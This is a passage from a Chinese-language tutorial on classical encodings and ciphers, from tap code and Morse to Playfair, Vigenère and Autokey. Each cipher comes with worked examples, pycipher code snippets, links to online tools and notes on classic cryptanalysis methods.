title="11.敲击码"></a>11.敲击码</h4><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p><p>敲击码表:</p><pre><code>  1  2  3  4  5
1 A  B C/K D  E
2 F  G  H  I  J 
3 L  M  N  O  P
4 Q  R  S  T  U
5 V  W  X  Y  Z
</code></pre><p><img src="http://img1.tuicool.com/raAVR3U.jpg" alt="敲击码.jpg"></p><hr><h4 id="12-莫尔斯电码"><a href="#12-莫尔斯电码" class="headerlink" title="12.莫尔斯电码"></a>12.莫尔斯电码</h4><p>摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用<code>/</code>划分）</li><li>以及句子之间长的停顿</li></ol><p>摩尔斯电码字母和数字对应表：</p><pre><code>A  .-    N  -.    .  .-.-.-  +  .-.-.     1  .----
B  -...  O  ---   ,  --..--  _  ..--.-     2  ..---
C  -.-.  P  .--.  :  ---...  $  ...-..-     3  ...--
D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...     4  ....-
E  .     R  .-.   &apos;  .----.  /  -..-.     5  .....
F  ..-.  S  ...   !  -.-.--               6  -....
G  --.   T  -     ?  ..--..               7  --...
H  ....  U  ..-   @  .--.-.               8  ---..
I  ..    V  ...-  -  -....-               9  ----.
J  .---  W  .--   ;  -.-.-.               0  -----
K  -.-   X  -..-  (  -.--.           
L  .-..  Y  -.--  )  -.--.-          
M  --    Z  --..  =  -...-                          
</code></pre><p>源文本:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>编码后:</p><pre><code>- .... . / --.- ..- .. -.-. -.- / -... .-. --- .-- -. / ..-. --- -..- / .--- ..- -- .--. ... / --- ...- . .-. / - .... . / .-.. .- --.. -.-- / -.. --- --.
</code></pre><p>在线编码解码<a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="external">传送门</a></p><p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如<code>·-·-·-·-·-</code>表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" target="_blank" rel="external">WiKi</a>。</p><hr><h4 id="13-编码的故事"><a href="#13-编码的故事" class="headerlink" title="13.编码的故事"></a>13.编码的故事</h4><p>推荐大家去看<a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS" target="_blank" rel="external">编码的故事</a>一文。</p><hr><h3 id="各种文本加密"><a href="#各种文本加密" class="headerlink" title="各种文本加密"></a>各种文本加密</h3><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。</p><p>加密示例：</p><p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p><img src="http://img2.tuicool.com/zqiEbay.png" alt="文本加密.png"></p><p>编码解码<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="external">链接</a></p><hr><h3 id="换位加密"><a href="#换位加密" class="headerlink" title="换位加密"></a>换位加密</h3><h4 id="1-栅栏密码"><a href="#1-栅栏密码" class="headerlink" title="1.栅栏密码"></a>1.栅栏密码</h4><p><strong>（1）介绍</strong></p><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>去空格：<code>Thequickbrownfoxjumpsoverthelazydog</code></p><p>分组：<code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p><p>第一组：<code>Teucbonojmsvrhlzdg</code></p><p>第二组：<code>hqikrwfxupoeteayo</code></p><p>密文：<code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="external">传送门</a></p><hr><h4 id="2-曲路密码"><a href="#2-曲路密码" class="headerlink" title="2.曲路密码"></a>2.曲路密码</h4><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>填入5行7列表(事先约定填充的行列数)</p><p><img src="http://img2.tuicool.com/aURZRvE.png" alt="曲路密码表.png"></p><p>加密的回路线(事先约定填充的行列数)</p><p><img src="http://img1.tuicool.com/rmiIv2Z.png" alt="曲路密码路径.png"></p><p>密文：<code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p><hr><h4 id="3-列移位密码"><a href="#3-列移位密码" class="headerlink" title="3.列移位密码"></a>3.列移位密码</h4><p><strong>（1）介绍</strong></p><p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p><p>填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)</p><p><img src="http://img2.tuicool.com/aURZRvE.png" alt="列移位密码.png"></p><p>密钥：<code>how are u</code></p><p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p><p><img src="http://img0.tuicool.com/AfiMnq3.png" alt="列移位密码示例.png"></p><p>密文：<code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p><p>这里提供一个行列数相等的填充规则列移位密码加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="external">链接</a></p><p>另外由列移位密码变化来的密码也有其他的，比如<a href="http://www.thonky.com/kryptos/amsco-cipher" target="_blank" rel="external">Amsco密码</a>(Amsco Cipher)和<a href="http://www.thonky.com/kryptos/cadenus-cipher" target="_blank" rel="external">Cadenus密码</a>(Cadenus Cipher)。</p><h3 id="替换加密"><a href="#替换加密" class="headerlink" title="替换加密"></a>替换加密</h3><hr><h4 id="1-埃特巴什码"><a href="#1-埃特巴什码" class="headerlink" title="1.埃特巴什码"></a>1.埃特巴什码</h4><p><strong>（1）介绍</strong></p><p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p><pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ
ZYXWVUTSRQPONMLKJIHGFEDCBA
</code></pre><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="external">传送门</a></p><hr><h4 id="2-凯撒密码"><a href="#2-凯撒密码" class="headerlink" title="2.凯撒密码"></a>2.凯撒密码</h4><p><strong>（1）介绍</strong></p><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="external">参考</a>。</p><p>加密实例：</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>偏移量：1</p><p>密文：<code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p><p><img src="http://img2.tuicool.com/2UzQjyu.png" alt="凯撒密码.png"></p><p>你也可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过<code>pip install pycipher</code>或者其他方式来安装pycipher模块。</p><pre><code>&gt;&gt;&gt; from pycipher import Caesar
&gt;&gt;&gt; Caesar(key=1).encipher(&apos;The quick brown fox jumps over the lazy dog&apos;)
&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;
&gt;&gt;&gt; Caesar(key=1).decipher(&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>参考表(这里是向后移位加密，向前移位解密)：</p><p><img src="http://img2.tuicool.com/yAfyYnM.jpg" alt="凯撒密码移位规律表.jpg"></p><p>加密解密<a href="http://planetcalc.com/1434/" target="_blank" rel="external">链接</a>(这个网站可以将26种情况一次性列举出来，比较方便)</p><hr><h4 id="3-ROT5-13-18-47"><a href="#3-ROT5-13-18-47" class="headerlink" title="3.ROT5/13/18/47"></a>3.ROT5/13/18/47</h4><p><strong>（1）介绍</strong></p><p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p><blockquote><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p></blockquote><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p><p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="4-简单替换密码"><a href="#4-简单替换密码" class="headerlink" title="4.简单替换密码"></a>4.简单替换密码</h4><p><strong>（1）介绍</strong></p><p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p><pre><code>明文字母 : abcdefghijklmnopqrstuvwxyz
明文字母 : phqgiumeaylnofdxjkrcvstzwb
</code></pre><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p><p><strong>（2）破解</strong></p><p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站<a href="http://quipqiup.com/index.php" target="_blank" rel="external">http://quipqiup.com/index.php</a>(翻= =墙)，这里推荐一篇通过”爬山算法”来破解简单替换密码<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/" target="_blank" rel="external">文章</a>，基于文中的算法实现的工具来破解示例。</p><p>密文：</p><pre><code>pmpafxaikkitprdsikcplifhwceigixkirradfeirdgkipgigudkcekiigpwrpucikceiginasikwduearrxiiqepcceindgmieinpwdfprduppcedoikiqiasafmfddfipfgmdafmfdteiki
</code></pre><p>解密：</p><p><img src="http://img2.tuicool.com/2If63mn.png" alt="破解简单替换密码.png"><br>(ps:score值越小越准确)</p><p>密钥：<code>PHQGIUMEAVLNOFDXBKRCZSTJWY</code></p><p>明文：</p><pre><code>AGAINPIERREWASOVERTAKENBYTHEDEPRESSIONHESODREADEDFORTHREEDAYSAFTERTHEDELIVERYOFHISSPEECHATTHELODGEHELAYONASOFAATHOMERECEIVINGNOONEANDGOINGNOWHERE
</code></pre><p>将明文转换成可读句子：</p><p>again pierre was over taken by the depression he so dreaded for three day safter the delivery of his speech at the lodge he lay on a sofa at home receiving no one and going no where</p><hr><h4 id="5-希尔密码"><a href="#5-希尔密码" class="headerlink" title="5.希尔密码"></a>5.希尔密码</h4><p><strong>（1）介绍</strong></p><p>希尔密码(Hill Cipher)是基于线性代数多重代换密码，由Lester S. Hill在1929年发明。每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。更多<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="external">参考</a></p><p><strong>（2）加密</strong></p><p>明文：<code>ACT</code></p><p><img src="http://img1.tuicool.com/aIZ3eiN.png" alt="字母数字对应表.png"></p><p>明文对应矩阵：</p><p><img src="http://img2.tuicool.com/uUNV3yz.png" alt="明文对应矩阵.png"></p><p>加密密钥：<code>GYBNQKURP</code></p><p>加密矩阵：</p><p><img src="http://img0.tuicool.com/uaaEZjm.png" alt="加密矩阵.png"></p><p>计算过程：</p><p><img src="http://img1.tuicool.com/jMzIfm6.png" alt="计算过程.png"></p><p>密文：<code>FIN</code></p><p><strong>（3）解密</strong></p><p>密文：<code>FIN</code></p><p>计算加密矩阵的逆矩阵：</p><p><img src="http://img2.tuicool.com/Vn2QV3B.png" alt="计算加密矩阵的逆矩阵.png"></p><p>解密计算：</p><p><img src="http://img0.tuicool.com/FBVRRn3.png" alt="解密计算.png"></p><p>明文：<code>ACT</code></p><p>至于证明和求逆可以参考线性代数知识。</p><p><strong>（4）破解</strong></p><p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p><p>这里推荐一篇关于用<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/" target="_blank" rel="external">已知明文样本攻击的方式破解希尔密码</a>的文章，基础的希尔密码用<a href="https://en.wikipedia.org/wiki/Known-plaintext_attack" target="_blank" rel="external">已知明文攻击</a>的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p><p>密文：</p><pre><code>XUKEXWSLZJUAXUNKIGWFSOZRAWURORKXAOSLHROBXBTKCMUWDVPTFBLMKEFVWMUXTVTWUIDDJVZKBRMCWOIWYDXMLUFPVSHAGSVWUFWORCWUIDUJCNVTTBERTUNOJUZHVTWKORSVRZSVVFSQXOCMUWPYTRLGBMCYPOJCLRIYTVFCCMUWUFPOXCNMCIWMSKPXEDLYIQKDJWIWCJUMVRCJUMVRKXWURKPSEEIWZVXULEIOETOOFWKBIUXPXUGOWLFPWUSCH
</code></pre><p>解密：</p><p>解密<a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="external">脚本实例</a></p><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="external">传送门</a></p><hr><h4 id="6-猪圈密码"><a href="#6-猪圈密码" class="headerlink" title="6.猪圈密码"></a>6.猪圈密码</h4><p><strong>（1）介绍</strong></p><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多<a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="external">参考</a></p><p>明文字母和对应密文：</p><p><img src="http://img1.tuicool.com/7Bbyyqu.jpg" alt="猪圈密码.jpg"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文：</p><p><img src="http://img1.tuicool.com/6JNfMju.png" alt="猪圈密码密文.png"></p><p>在线加密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="external">传送门</a></p><p><strong>（2）变种</strong></p><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p><p>明文字母和对应密文：</p><p><img src="http://img2.tuicool.com/eeUfQzM.png" alt="猪圈密码变种.png"></p><p><strong>（3）其他变种</strong></p><p>明文字母和对应密文：</p><p><img src="http://img0.tuicool.com/7vYjyyz.jpg" alt="猪圈密码变种1.jpg"></p><p>明文字母和对应密文：</p><p><img src="http://img0.tuicool.com/2aYnaqR.jpg" alt="猪圈密码变种2.jpg"></p><p>明文字母和对应密文：</p><p><img src="http://img2.tuicool.com/Nnqme2b.png" alt="猪圈密码变种3.png"></p><hr><h4 id="7-波利比奥斯方阵密码"><a href="#7-波利比奥斯方阵密码" class="headerlink" title="7.波利比奥斯方阵密码"></a>7.波利比奥斯方阵密码</h4><p><strong>（1）介绍</strong></p><p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多<a href="https://en.wikipedia.org/wiki/Polybius_square" target="_blank" rel="external">参考</a></p><p>常见的排布方式：</p><p><img src="http://img2.tuicool.com/mmuMbqM.png" alt="波利比奥斯方阵密码.png"></p><p>加密实例：</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文：<code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p><hr><h4 id="8-夏多密码-曲折加密"><a href="#8-夏多密码-曲折加密" class="headerlink" title="8.夏多密码(曲折加密)"></a>8.夏多密码(曲折加密)</h4><p><strong>（1）介绍</strong></p><p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p><p><img src="http://img1.tuicool.com/MZZ3yq.png" alt="夏多密码.png"></p><blockquote><p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下；<br>符号2表示纸张上端朝右，依次类推。</p></blockquote><p>源文本：<code>I AM IN DANGER SEND HELP(我有危险，速来增援)</code></p><p>密文：</p><p><img src="http://img0.tuicool.com/nIJVneU.jpg" alt="夏多密码示例.jpg"></p><hr><h4 id="9-普莱菲尔密码"><a href="#9-普莱菲尔密码" class="headerlink" title="9.普莱菲尔密码"></a>9.普莱菲尔密码</h4><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：<br><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>和密钥<code>CULTURE</code>为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">二方密码</a>(Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p><p><strong>(1)编制密码表</strong></p><p>1.整理密钥字母<code>C U L T U R E</code>，去掉后面重复的字母得到：<code>C U L T R E</code></p><p>2.用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p><p><img src="http://img0.tuicool.com/7jQJVne.png" alt="普莱菲尔密码.png"></p><blockquote><p>这一步需要注意的要点：整理密钥字母时，如果出现”Z”，则需要去除，因为在英文里”Z”的使用频率最低，相应的如果是德文，则需将”I”与”J”当作一个字母来看待，而法语则去掉”W”或”K”。</p></blockquote><p><strong>(2)整理明文</strong></p><p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>与字母”<code>X</code>“：</p><p>1.将明文两两一组按顺序排开，得到：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p><p>2.对于末尾的单个字母要加上一个”<code>X</code>“使之成对：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><blockquote><p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加”<code>X</code>“，例如<code>TOMORROW</code>，需要写成：<code>TO MO RX RX OW</code>。</p></blockquote><p><strong>(3)编写密文</strong></p><p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p><blockquote><p>1.如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为”<code>CE</code>“，依据上表，应替换为”<code>EG</code>“；</p><p>2.如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为”<code>OQ</code>“，依据上表，应替换为”<code>PS</code>“；</p><p>3.如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为”<code>HX</code>“，可以替换为”<code>WI/J</code>“或”<code>I/JW</code>“（下面的例子将按照横向替换原则即同行优先）。</p></blockquote><p>按照上述原则，将明文<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code>加以转换得到<code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code>（/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文<code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code>。</p><p>加密解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="external">传送门</a>(ps：这里加解密是横向编制密码表)</p><p>加密解密实例(ps：这里加解密也是横向编制密码表)：</p><pre><code>&gt;&gt;&gt;from pycipher import Playfair
&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;
&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).decipher(&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;)
&apos;THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX&apos;
</code></pre><hr><h4 id="10-维吉尼亚密码"><a href="#10-维吉尼亚密码" class="headerlink" title="10.维吉尼亚密码"></a>10.维吉尼亚密码</h4><p><strong>（1）介绍</strong></p><p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="external">参考</a>。</p><p>密表：</p><p><img src="http://img0.tuicool.com/rUV7rqB.png" alt="维吉尼亚密码.png"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p><p>密文：<code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p><p><strong>（2）已知密钥加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Vigenere
&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;
&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>在线加密解密<a href="http://planetcalc.com/2468/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密钥破解</strong></p><p>可以参考<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">维吉尼亚密码分析</a>这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数</a>算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用<a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="external">卡方检验</a>来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p><p>密文：<code>kiqpbkxspshwehospzqhoinlgapp</code></p><p>解密：</p><p><img src="http://img2.tuicool.com/bEvaeaj.png" alt="维吉尼亚密码破解.png"><br>(ps:结合左边的值，密钥以及解出明文可以确定kien 5或者klen 10为准确的结果)</p><p>明文：<code>DEFEND THE EAST WALL OF THE CASTLE</code></p><p><strong>（4）变种</strong></p><p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用<a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html" target="_blank" rel="external">卡西斯基算法</a>(kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p><p><img src="http://img2.tuicool.com/iqueIze.png" alt="格罗斯费尔德密码.png"></p><pre><code>&gt;&gt;&gt;from pycipher import Gronsfeld
&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;
&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>在线加解密<a href="http://rumkin.com/tools/cipher/gronsfeld.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="11-自动密钥密码"><a href="#11-自动密钥密码" class="headerlink" title="11.自动密钥密码"></a>11.自动密钥密码</h4><p><strong>（1）介绍</strong></p><p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.下面我们以关键词自动密钥为例：</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>关键词：<code>CULTURE</code></p><p>自动生成密钥：<code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p><p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p><p>密文：<code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p><p><strong>（2）已知关键词加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Autokey
&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;
&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知关键词破解</strong></p><p>推荐去看这篇<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/" target="_blank" rel="external">自动密钥密码分析文章</a>，基于文中的算法实现的工具来破解示例。</p><p>密文:</p><pre><code>isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl
</code></pre><p>解密</p><p><img src="http://img1.tuicool.com/ANJ7buY.png" alt="自动密钥密码破解.png"><br>(ps:从klen 13可以看出使用的关键词为’FORTIFICATION’)</p><p>明文：</p><pre><code>DESPITEBEINGMORESECURETHANTHEVIGENERECIPHERTHEAUTOKEYCIPHERISSTILLVERYEASYTOBREAKUSINGAUTOMATEDMETHODS
